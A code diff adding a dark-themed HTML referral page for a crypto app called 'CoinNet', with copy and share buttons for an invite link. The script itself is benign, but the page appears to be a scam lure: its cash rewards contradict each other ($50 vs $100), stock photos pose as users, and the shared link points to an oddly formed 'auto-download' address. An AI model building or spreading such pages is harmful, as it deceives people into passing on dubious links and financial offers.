@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>Share invite</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+<style>
+  body {
+    margin: 0;
+    font-family: 'Inter', sans-serif;
+    background-color: #000;
+    color: #fff;
+  }
+
+  .container {
+    padding: 20px;
+  }
+
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+  }
+
+  .back-button {
+    background: #111;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: default;
+  }
+
+  .track-referrals {
+    background: #111;
+    border-radius: 20px;
+    padding: 8px 16px;
+    font-size: 14px;
+    color: #fff;
+    cursor: default;
+  }
+
+  .promo-box {
+    background: #222;
+    border-radius: 20px;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .promo-title {
+    font-size: 24px;
+    font-weight: bold;
+    color: #fff;
+  }
+
+  .promo-desc {
+    font-size: 14px;
+    margin: 10px 0;
+    color: #ccc;
+  }
+
+  .avatar-group {
+    position: relative;
+    display: inline-flex;
+    margin: 20px 0;
+  }
+
+  .avatar {
+    width: 45px;
+    height: 45px;
+    border-radius: 50%;
+    object-fit: cover;
+    margin-left: -10px;
+    border: 2px solid #000;
+  }
+
+  .gift-icon {
+    position: absolute;
+    right: -10px;
+    top: -10px;
+    background: #fff;
+    color: #000;
+    border-radius: 50%;
+    width: 30px;
+    height: 30px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 2px 5px rgba(255, 255, 255, 0.2);
+  }
+
+  .gift-icon::before {
+    content: '🎁';
+    font-size: 16px;
+  }
+
+  .link-box {
+    display: flex;
+    align-items: center;
+    background: #111;
+    border-radius: 10px;
+    padding: 10px;
+    overflow: hidden;
+    justify-content: space-between;
+  }
+
+  .link-box input {
+    background: none;
+    border: none;
+    color: white;
+    font-size: 14px;
+    width: 100%;
+    outline: none;
+  }
+
+  .copy-btn {
+    background: #fff;
+    color: #000;
+    border: none;
+    border-radius: 10px;
+    padding: 8px 16px;
+    cursor: default;
+    margin-left: 10px;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: #000;
+    padding: 10px 20px;
+    border-top: 1px solid #333;
+  }
+
+  .footer-content {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 10px;
+  }
+
+  .share-btn {
+    background: #fff;
+    color: #000;
+    border: none;
+    border-radius: 20px;
+    padding: 12px;
+    font-weight: bold;
+    width: 100%;
+    text-align: center;
+    cursor: default;
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 100px;
+    left: 50%;
+    transform: translateX(-50%) translateY(20px);
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(8px);
+    color: #fff;
+    padding: 12px 24px;
+    border-radius: 30px;
+    font-size: 14px;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s ease, transform 0.3s ease;
+    z-index: 9999;
+  }
+
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+
+  .checkmark {
+    display: none;
+    font-size: 16px;
+  }
+
+  .copy-btn.success .checkmark {
+    display: inline;
+    animation: popIn 0.3s ease;
+  }
+
+  @keyframes popIn {
+    from { transform: scale(0.5); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+
+  .back-button svg {
+    width: 20px;
+    height: 20px;
+    stroke: #fff;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="back-button" onclick="window.history.go(-1)">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
+          <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <a href="history.html" style="text-decoration: none;"><div class="track-referrals">Track referrals</div></a>
+    </div>
+
+    <div class="promo-box">
+      <div class="promo-title">Share <b style="color: #fff;">CoinNet</b> And Earn $50</div>
+      <div class="promo-desc">
+        Share <b style="color: #fff;">CoinNet</b> with 3 friends and earn $100 for yourself. Your friends get a free $50 reward for signing up.
+      </div>
+
+      <div class="avatar-group">
+        <img src="https://i.imgur.com/8Km9tLL.jpg" alt="White Woman 1" class="avatar">
+        <img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?crop=faces&fit=crop&w=100&h=100" alt="White Man 1" class="avatar">
+        <img src="https://images.unsplash.com/photo-1520813792240-56fc4a3765a7?crop=faces&fit=crop&w=100&h=100" alt="White Woman 2" class="avatar">
+        <div class="gift-icon"></div>
+      </div>
+
+      <div class="link-box">
+        <input type="text" id="invite-link" readonly value="https://auto-download.github.io/.com">
+        <button class="copy-btn" id="copy-btn" onclick="copyLink()">
+          Copy <span class="checkmark">&#10003;</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-content">
+      <div class="avatar-group">
+        <img src="https://i.imgur.com/8Km9tLL.jpg" alt="White Woman 1" class="avatar">
+        <img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?crop=faces&fit=crop&w=100&h=100" alt="White Man 1" class="avatar">
+        <img src="https://images.unsplash.com/photo-1520813792240-56fc4a3765a7?crop=faces&fit=crop&w=100&h=100" alt="White Woman 2" class="avatar">
+        <div class="gift-icon"></div>
+      </div>
+    </div>
+    <button class="share-btn" onclick="shareWise()">Share To Friends</button>
+  </div>
+
+  <div id="toast" class="toast">Link copied to clipboard!</div>
+  <div id="share-toast" style="width: 55%;" class="toast">Sharing not supported on this device!</div>
+
+ <style>
+    #message-box {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #444;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      z-index: 1000;
+    }
+
+    #message-box.show {
+      opacity: 1;
+    }
+  </style>
+  <div id="message-box"></div>
+  <script>
+    const messageBox = document.getElementById('message-box');
+
+    function showMessage(text, duration = 3000) {
+      messageBox.textContent = text;
+      messageBox.classList.add('show');
+
+      setTimeout(() => {
+        messageBox.classList.remove('show');
+      }, duration);
+    }
+
+    window.addEventListener('online', () => {
+      showMessage('You are now online.');
+    });
+
+    window.addEventListener('offline', () => {
+      showMessage('Error: You are currently offline.');
+    });
+  </script>
+  
+  <script>
+    function copyLink() {
+      const linkInput = document.getElementById('invite-link');
+      const copyBtn = document.getElementById('copy-btn');
+      navigator.clipboard.writeText(linkInput.value).then(() => {
+        showToast();
+        copyBtn.classList.add('success');
+        setTimeout(() => {
+          copyBtn.classList.remove('success');
+        }, 1500);
+      });
+    }
+
+    function showToast() {
+      const toast = document.getElementById('toast');
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 2000);
+    }
+
+    function shareWise() {
+      const shareData = {
+        title: 'Join me on CoinNet',
+        text: 'Unlock the future of finance today! Sign up for CoinNet and take control of your investments with ease, security, real-time insights and 24hr crypto migration. Your financial journey starts now!',
+        url: 'https://auto-download.github.io/.com'
+      };
+
+      if (navigator.share) {
+        navigator.share(shareData)
+          .then(() => console.log('Shared successfully'))
+          .catch((error) => console.error('Error sharing:', error));
+      } else {
+        copyLink();
+        showShareToast();
+      }
+    }
+
+    function showShareToast() {
+      const shareToast = document.getElementById('share-toast');
+      shareToast.classList.add('show');
+      setTimeout(() => {
+        shareToast.classList.remove('show');
+      }, 2000);
+    }
+  </script>
+  <script src="disable-zoom.js"></script>
+</body>
+</html>
